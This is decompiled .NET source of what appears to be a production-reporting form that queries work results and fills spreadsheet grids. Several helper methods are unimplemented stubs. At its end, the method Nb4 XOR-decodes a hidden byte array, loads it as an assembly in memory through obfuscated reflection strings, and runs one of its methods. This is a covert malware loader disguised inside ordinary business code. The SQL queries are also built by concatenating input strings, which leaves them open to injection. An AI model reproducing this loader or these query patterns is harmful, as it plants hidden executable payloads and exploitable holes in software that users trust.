		object[] array12 = new object[2];
		obj3 = t1T;
		array12[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array12[1] = 0;
		array2 = array12;
		obj5 = NewLateBinding.LateGet(obj20, (Type)null, "GetValue", array12, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text5, obj5), (object)"'"), (object)"\r\n"));
		string text6 = text + "  and wk_date = '";
		object obj21 = NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array13 = new object[2];
		obj3 = t1T;
		array13[0] = NewLateBinding.LateGet(obj3, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null);
		array13[1] = 1;
		array2 = array13;
		obj5 = NewLateBinding.LateGet(obj21, (Type)null, "GetValue", array13, (string[])null, (Type[])null, array3 = new bool[2] { true, false });
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj3, (Type)null, "Row", new object[1] { array2[0] }, (string[])null, (Type[])null, true, false);
		}
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text6, obj5), (object)"'"), (object)"\r\n"));
		text += "group by model, wk_date, hour order by model, wk_date, hour";
		obj = null;
		if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(t1T, (Type)null, "Row", new object[0], (string[])null, (Type[])null, (bool[])null), Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread1, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1), false))
		{
			object obj22 = NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
			if (Zi8(RuntimeHelpers.GetObjectValue(FpSpread2), text, 1) && Conversions.ToBoolean(Operators.AndObject(Operators.CompareObjectGreater(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false), Operators.CompareObjectGreater(NewLateBinding.LateGet(obj22, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				NewLateBinding.LateSetComplex(obj3 = obj22, (Type)null, "RowCount", new object[1] { Operators.AddObject(NewLateBinding.LateGet(obj3, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj22, (Type)null, "Cells", new object[4]
				{
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
					1,
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj22, (Type)null, "Cells", new object[4]
				{
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
					0,
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "BackColor", new object[1] { Color.Yellow }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateCall(obj22, (Type)null, "SetText", new object[3]
				{
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1),
					0,
					"TOTAL"
				}, (string[])null, (Type[])null, (bool[])null, true);
				q6G(RuntimeHelpers.GetObjectValue(FpSpread2), 1, Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1), 1);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj22, (Type)null, "Columns", new object[2]
				{
					0,
					Operators.SubtractObject(NewLateBinding.LateGet(obj22, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "Locked", new object[1] { false }, (string[])null, (Type[])null, false, true);
			}
			obj22 = null;
		}
	}

	public string Ja3(string My3)
	{
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(i8W(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("SELECT DISTINCT (SELECT EMP_NM FROM TBL_EMPMASTER WHERE EMP_NO = OP_CD) AS EMP_NM FROM tbl_wkresult WHERE SITE_ID = '" + Site_id + "' AND WK_DATE BETWEEN '"), NewLateBinding.LateGet(DateTimeInput1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' AND '"), NewLateBinding.LateGet(DateTimeInput2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' AND C_PRC = (SELECT CODE_ID FROM TBL_CODEMASTER WHERE CLASS_ID = 'R0001' AND CODE_NAME ='"), (object)My3), (object)"') ORDER BY EMP_NM")));
		object obj = NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null);
		checked
		{
			if (objectValue == null)
			{
				MessageBox.Show("NO DATA!");
				string text = "";
			}
			else
			{
				NewLateBinding.LateSetComplex(obj, (Type)null, "RowCount", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(obj, (Type)null, "ColumnCount", new object[1] { NewLateBinding.LateGet(objectValue, (Type)null, "RecordCount", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateCall(obj, (Type)null, "AddColumns", new object[2] { 0, 1 }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Height", new object[1] { 60 }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "WORK HOUR" }, (string[])null, (Type[])null, false, true);
				int num = Conversions.ToInteger(NewLateBinding.LateGet(objectValue, (Type)null, "RecordCount", new object[0], (string[])null, (Type[])null, (bool[])null));
				for (int i = 1; i <= num; i++)
				{
					object[] array;
					bool[] array2;
					object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
					if (array2[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					NewLateBinding.LateSetComplex(obj2, (Type)null, "Label", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateIndexGet(objectValue, new object[1] { 0 }, (string[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null, false, true);
					obj2 = NewLateBinding.LateGet(obj, (Type)null, "Columns", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
					if (array2[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					NewLateBinding.LateSetComplex(obj2, (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateCall(objectValue, (Type)null, "MoveNext", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				NewLateBinding.LateSetComplex(obj, (Type)null, "ColumnCount", new object[1] { Operators.AddObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj, (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Label", new object[1] { "TOTAL" }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "CellType", new object[1] { intcell }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "BackColor", new object[1] { Color.Yellow }, (string[])null, (Type[])null, false, true);
				Fw6(RuntimeHelpers.GetObjectValue(FpSpread2));
				NewLateBinding.LateSetComplex(obj, (Type)null, "FrozenColumnCount", new object[1] { 2 }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj, (Type)null, "Columns", new object[2]
				{
					1,
					Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "Width", new object[1] { 50 }, (string[])null, (Type[])null, false, true);
			}
			obj = null;
			string text2 = "";
			text2 = "select hour,\r\n" + text2;
			int num2 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)2));
			for (int i = 1; i <= num2; i++)
			{
				string text3 = text2 + "\t\tisnull((select sum(cnt) from tbl_wkresult where model = a.model and wk_date = a.wk_date and hour = a.hour and c_prc = (select code_id from tbl_codemaster where class_id = 'R0001' and code_name = '" + My3 + "' ) and op_cd = (select emp_no from tbl_empmaster where emp_nm = '";
				object[] array;
				bool[] array2;
				object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(FpSpread2, (Type)null, "ActiveSheet", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ColumnHeader", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", array = new object[1] { i }, (string[])null, (Type[])null, array2 = new bool[1] { true });
				if (array2[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
				}
				text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text3, NewLateBinding.LateGet(obj2, (Type)null, "Label", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' )),0),"), (object)"\r\n"));
			}
			return text2 + "\t\tisnull((select sum(cnt) from tbl_wkresult where model = a.model and wk_date = a.wk_date and hour = a.hour and c_prc = (select code_id from tbl_codemaster where class_id = 'R0001' and code_name = '" + My3 + "' )),0)\r\n";
		}
	}

	private object i8W(object c1X)
	{
		throw new NotImplementedException();
	}

	private void Fa1(object sender, EventArgs e)
	{
	}

	private void Ma8(object sender, EventArgs e)
	{
	}

	private void g1S(object sender, EventArgs e)
	{
	}

	private void w0R(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(save_excel, "", false) == 0)
		{
			MessageBox.Show("Select Spread for Printing!!");
		}
		else if (Operators.CompareString(save_excel, "FpSpread1", false) == 0)
		{
			if (!x0C(RuntimeHelpers.GetObjectValue(FpSpread1), "WIP Inventory(Board) Summary", 0))
			{
				Interaction.MsgBox((object)"Fail to Print", (MsgBoxStyle)0, (object)null);
			}
		}
		else if (Operators.CompareString(save_excel, "FpSpread2", false) == 0)
		{
			if (!x0C(RuntimeHelpers.GetObjectValue(FpSpread2), "WIP Inventory(Board) Details", 0))
			{
				Interaction.MsgBox((object)"Fail to Print", (MsgBoxStyle)0, (object)null);
			}
		}
		else
		{
			MessageBox.Show("Select Spread for Printing!!");
		}
	}

	private bool x0C(object Sq5, string g5P, int Mt1)
	{
		throw new NotImplementedException();
	}

	private void d8Z(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(save_excel, "", false) == 0)
		{
			MessageBox.Show("Select Spread for Saving!!");
		}
		else if (Operators.CompareString(save_excel, "FpSpread1", false) == 0)
		{
			o0C(RuntimeHelpers.GetObjectValue(SaveFileDialog1), RuntimeHelpers.GetObjectValue(FpSpread1));
		}
		else if (Operators.CompareString(save_excel, "FpSpread2", false) == 0)
		{
			o0C(RuntimeHelpers.GetObjectValue(SaveFileDialog1), RuntimeHelpers.GetObjectValue(FpSpread2));
		}
		else
		{
			MessageBox.Show("Select Spread for Saving!!");
		}
	}

	private void o0C(object c8E, object k7L)
	{
		throw new NotImplementedException();
	}

	private void w3S(object Pg8, object k3K)
	{
		save_excel = "FpSpread1";
	}

	private void f0X(object f6C, object r8A)
	{
		save_excel = "FpSpread2";
	}

	internal static void Nb4(List<object> k5P, byte[] g2T, int Wz0)
	{
		checked
		{
			byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(k5P[3], (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
			int num = ((byte[])k5P[3]).Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + y8P.Py1(Wz0, g2T.Length);
				int s5R = num2 & Wz0;
				int num3 = y8P.Py1(i, g2T.Length);
				int g5M = g2T[num3];
				int s5R2 = Conversions.ToInteger(Pi5.Xf4(g5M, s5R));
				int num4 = Conversions.ToInteger(Pi5.Xf4(Convert.ToInt32(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(k5P[3], new object[1] { i }, (string[])null))), s5R2));
				array[i] = (byte)num4;
			}
			k5P.Add("AsSsMmB");
			k5P.Add("@System@.@Reflection@.@Assembly@");
			k5P.Add("@@@Load@@@");
			k5P.Add(AppDomain.CurrentDomain);
			k5P.Add(((AppDomain)k5P[8]).Load(array).GetTypes()[34].GetMethod("Method0"));
			((MethodInfo)k5P[9]).Invoke(null, new object[0]);
		}
	}
}
